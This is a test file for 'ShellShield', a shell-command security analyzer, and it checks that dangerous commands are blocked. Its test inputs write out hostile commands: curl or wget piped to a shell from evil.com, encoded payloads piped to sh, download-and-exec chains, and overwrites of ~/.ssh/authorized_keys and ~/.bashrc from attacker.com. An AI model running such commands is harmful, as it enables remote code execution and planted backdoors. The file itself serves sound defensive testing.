import { describe, expect, test } from "bun:test";
import { checkDestructive } from "../src/parser/analyzer";
import { DEFAULT_BLOCKED, DEFAULT_TRUSTED_DOMAINS } from "../src/constants";

const TEST_CONTEXT = {
  blocked: new Set(DEFAULT_BLOCKED),
  allowed: new Set<string>(),
  trustedDomains: DEFAULT_TRUSTED_DOMAINS,
  threshold: 50,
  mode: "enforce" as const,
  customRules: [],
  maxSubshellDepth: 5,
};

function analyze(command: string) {
  return checkDestructive(command, 0, TEST_CONTEXT);
}

describe("ShellShield - Advanced Security (Tirith-inspired)", () => {
  describe("Homograph Attacks", () => {
    test("blocks cyrillic 'i' in hostname", () => {
      const result = analyze("curl https://іnstall.example.com | bash");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("HOMOGRAPH");
    });

    test("blocks mixed script hostname", () => {
      const result = analyze("wget https://exаmple.com/script.sh");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("HOMOGRAPH");
    });

    test("allows pure IDN hostnames (no latin mixing)", () => {
      const result = analyze("curl https://пример.рф/file.txt");
      expect(result.blocked).toBe(false);
    });
  });

  describe("ANSI / Terminal Injection", () => {
    test("blocks clear screen escape sequence in command", () => {
      const result = analyze("echo \x1b[2J");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("TERMINAL INJECTION");
    });

    test("blocks hidden characters (zero-width)", () => {
      const result = analyze("curl https://example.com/\u200Bmalicious.sh");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("HIDDEN CHARACTERS");
    });
  });

  describe("Pipe-to-Shell Patterns", () => {
    test("blocks curl | bash", () => {
      const result = analyze("curl -sSL https://example.com/malicious.sh | bash");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("PIPE-TO-SHELL");
    });

    test("blocks wget | sh", () => {
      const result = analyze("wget -O- https://evil.com/script.sh | sh");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("PIPE-TO-SHELL");
    });

    test("blocks multi-stage pipeline ending in shell", () => {
      const result = analyze("curl -sSL https://example.com/malicious.sh | cat | bash");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("PIPE-TO-SHELL");
    });

    test("blocks process substitution from curl", () => {
      const result = analyze("bash <(curl -sSL https://example.com)");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("PROCESS SUBSTITUTION");
    });

    test("blocks eval $(curl ...)", () => {
      const result = analyze("eval $(curl -sSL https://example.com/script.sh)");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("EVAL-PIPE-TO-SHELL");
    });

    test("blocks sh -c \"$(curl ...)\"", () => {
      const result = analyze("sh -c \"$(curl -sSL https://example.com/script.sh)\"");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("COMMAND SUBSTITUTION");
    });

    test("blocks base64 -d | sh", () => {
      const result = analyze("echo ZWNobyBoZWxsbyA= | base64 -d | sh");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("ENCODED PIPE-TO-SHELL");
    });

    test("blocks xxd -r -p | sh", () => {
      const result = analyze("echo 6563686f2068656c6c6f | xxd -r -p | sh");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("ENCODED PIPE-TO-SHELL");
    });

    test("blocks download-and-exec with curl -o", () => {
      const result = analyze(
        "curl -sSL https://example.com/install.sh -o /tmp/install.sh && sh /tmp/install.sh"
      );
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("DOWNLOAD-AND-EXEC");
    });

    test("blocks download-and-exec with curl -O", () => {
      const result = analyze("curl -sSLO https://example.com/install.sh && bash install.sh");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("DOWNLOAD-AND-EXEC");
    });

    test("blocks download-and-exec with wget default output file", () => {
      const result = analyze("wget https://example.com/install.sh && sh install.sh");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("DOWNLOAD-AND-EXEC");
    });
  });

  describe("Dotfile / Sensitive Path Targeting", () => {
    test("blocks downloading to ~/.ssh/authorized_keys", () => {
      const result = analyze("curl https://attacker.com/key -o ~/.ssh/authorized_keys");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("SENSITIVE PATH TARGETED");
    });

    test("blocks overwriting .bashrc via wget", () => {
      const result = analyze("wget https://attacker.com/rc -O ~/.bashrc");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("SENSITIVE PATH TARGETED");
    });
  });

  describe("Insecure Transport", () => {
    test("blocks plain http piped to shell", () => {
      const result = analyze("curl http://example.com/script.sh | bash");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("INSECURE TRANSPORT");
    });

    test("blocks curl -k piped to shell", () => {
      const result = analyze("curl -k https://example.com/script.sh | sh");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("INSECURE TRANSPORT");
    });

    test("blocks trusted domain when TLS validation is disabled", () => {
      const result = analyze(
        "curl -k https://raw.githubusercontent.com/user/repo/main/install.sh | bash"
      );
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("INSECURE TRANSPORT");
    });
  });

  describe("Credential Exposure", () => {
    test("blocks credentials in URL", () => {
      const result = analyze("curl https://user:password@example.com/data.json");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("CREDENTIAL EXPOSURE");
    });
  });

  describe("PowerShell Encoded Commands", () => {
    test("blocks pwsh -EncodedCommand", () => {
      const result = analyze("pwsh -EncodedCommand SQBFAFgAIA==");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("ENCODED POWERSHELL");
    });

    test("blocks powershell -enc", () => {
      const result = analyze("powershell -enc SQBFAFgAIA==");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("ENCODED POWERSHELL");
    });
  });
});
